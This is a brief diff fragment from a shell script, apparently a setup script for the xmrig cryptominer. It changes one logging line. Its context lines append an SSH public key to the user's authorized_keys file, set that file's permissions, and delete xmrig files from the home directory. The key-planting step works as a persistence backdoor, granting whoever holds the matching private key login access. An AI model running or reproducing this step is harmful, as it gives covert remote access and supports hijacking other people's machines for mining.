@@ -410,7 +410,7 @@ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4g
 chmod 600 ~/.ssh/authorized_keys
 
 # New addition: Delete xmrig files in login directory
-log_message "Cleaning up xmrig files in login directory..."
+echo "[*] Cleaning up xmrig files in login directory..."
 rm -rf ~/xmrig*.*
 
 echo "[*] Setup complete"
